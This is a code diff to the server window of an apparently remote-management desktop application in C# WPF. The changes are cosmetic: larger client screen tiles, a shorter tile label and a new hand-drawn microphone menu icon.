@@ -105,10 +105,9 @@ public partial class ServerWindow : Window
             var svcPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "services.msc");
             if (ShellIcon.GetFromPath(svcPath) is { } svcIco)
                 SvcMgrMenuIcon.Source = svcIco;
-            var camPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "wmploc.dll");
-            // Try Windows Camera from %ProgramFiles%\WindowsApps — fall back to photo icon from shell32
             var camIcon = TryLoadCameraIcon();
             if (camIcon != null) CamMenuIcon.Source = camIcon;
+            MicMenuIcon.Source = MakeMicIcon();
 
             // Wrap in CollectionView so we can filter without modifying _onlineClients
             var view = System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients);
@@ -3701,7 +3700,6 @@ Read-Host 'Press Enter to close'
     {
         if (_server == null) return;
         var clients = _server.ConnectedClients.Values.ToList();
-        TxtScreenCount.Text = $"{clients.Count} client{(clients.Count != 1 ? "s" : "")}";
 
         // Remove tiles for disconnected clients
         var ids = clients.Select(c => c.Id).ToHashSet();
@@ -3740,15 +3738,15 @@ Read-Host 'Press Enter to close'
         var img = new System.Windows.Controls.Image
         {
             Stretch = Stretch.Uniform,
-            Height  = 200,
+            Height  = 240,
             HorizontalAlignment = HorizontalAlignment.Stretch
         };
 
         var label = new TextBlock
         {
-            Text = $"{client.Username}  [{client.Id[..Math.Min(8, client.Id.Length)]}]  {client.IP}",
+            Text = client.Id,
             Foreground = new SolidColorBrush(Color.FromRgb(0x50, 0x58, 0x80)),
-            FontSize = 9.5, FontFamily = new System.Windows.Media.FontFamily("Consolas"),
+            FontSize = 10, FontFamily = new System.Windows.Media.FontFamily("Consolas"),
             Margin = new Thickness(6, 3, 6, 4),
             TextTrimming = System.Windows.TextTrimming.CharacterEllipsis
         };
@@ -3760,7 +3758,7 @@ Read-Host 'Press Enter to close'
 
         var border = new System.Windows.Controls.Border
         {
-            Width = 320, Margin = new Thickness(6),
+            Width = 380, Margin = new Thickness(6),
             Background   = new SolidColorBrush(Color.FromRgb(0x07, 0x08, 0x12)),
             BorderBrush  = new SolidColorBrush(Color.FromRgb(0x1A, 0x1E, 0x36)),
             BorderThickness = new Thickness(1),
@@ -3930,6 +3928,37 @@ Read-Host 'Press Enter to close'
         }
         catch { }
         return null;
+    }
+
+    private static System.Windows.Media.ImageSource MakeMicIcon()
+    {
+        var pink = new System.Windows.Media.SolidColorBrush(
+            System.Windows.Media.Color.FromRgb(0xF3, 0x8B, 0xA8));
+        var pen = new System.Windows.Media.Pen(pink, 1.3)
+        {
+            StartLineCap = System.Windows.Media.PenLineCap.Round,
+            EndLineCap   = System.Windows.Media.PenLineCap.Round
+        };
+        // U-shaped stand arc
+        var arc = new System.Windows.Media.PathGeometry();
+        var fig = new System.Windows.Media.PathFigure { StartPoint = new System.Windows.Point(3, 6), IsClosed = false };
+        fig.Segments.Add(new System.Windows.Media.QuadraticBezierSegment(
+            new System.Windows.Point(8, 13), new System.Windows.Point(13, 6), true));
+        arc.Figures.Add(fig);
+        var dg = new System.Windows.Media.DrawingGroup();
+        using (var ctx = dg.Open())
+        {
+            // Capsule body
+            ctx.DrawRoundedRectangle(pink, null, new System.Windows.Rect(5, 1, 6, 7), 3, 3);
+            // Stand arc
+            ctx.DrawGeometry(null, pen, arc);
+            // Pole + base
+            ctx.DrawLine(pen, new System.Windows.Point(8, 11), new System.Windows.Point(8, 14));
+            ctx.DrawLine(pen, new System.Windows.Point(5, 14), new System.Windows.Point(11, 14));
+        }
+        var img = new System.Windows.Media.DrawingImage(dg);
+        img.Freeze();
+        return img;
     }
 
     private void Close_Click(object sender, RoutedEventArgs e)
